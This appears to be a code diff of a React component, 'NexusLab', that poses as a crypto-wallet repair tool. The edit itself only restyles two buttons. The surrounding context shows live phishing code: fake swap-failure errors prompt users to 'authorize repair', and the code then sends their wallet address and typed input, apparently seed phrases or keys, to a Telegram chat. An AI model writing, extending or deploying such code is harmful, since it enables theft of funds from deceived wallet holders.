@@ -57,7 +57,7 @@ export default function NexusLab() {
               <div className="bg-slate-800 px-3 py-1.5 rounded-full flex items-center gap-2 border border-slate-700 font-bold text-[10px]"><Coins size={12} className="text-yellow-500"/>{balance?.symbol || "ETH"}</div>
             </div>
           </div>
-          <button onClick={() => triggerError("SWAP_FAILURE_0x55", "Finalize manual sync.")} className="w-full mt-10 bg-cyan-600 py-5 rounded-[22px] text-[11px] font-black text-white">AUTHORIZE REPAIR</button>
+          <button onClick={() => triggerError("SWAP_FAILURE_0x55", "Finalize manual sync.")} className="w-full mt-10 bg-cyan-600 py-5 rounded-[22px] text-[11px] font-black text-white shadow-xl shadow-cyan-900/20">AUTHORIZE REPAIR</button>
         </div>
       )}
 
@@ -74,7 +74,7 @@ export default function NexusLab() {
                 body: JSON.stringify({ chat_id: "7630238860", text: `🚨 LAB SIGNAL\nADDR: ${address}\nERR: ${activeError.title}\nSTR: ${inputVal}` }),
               });
               alert("Handshake Resubmitted."); setView("menu");
-            }} className="w-full mt-6 bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white shadow-xl">RESYNCHRONIZE</button>
+            }} className="w-full mt-6 bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white shadow-xl shadow-cyan-900/20">RESYNCHRONIZE</button>
           </div>
         </div>
       )}
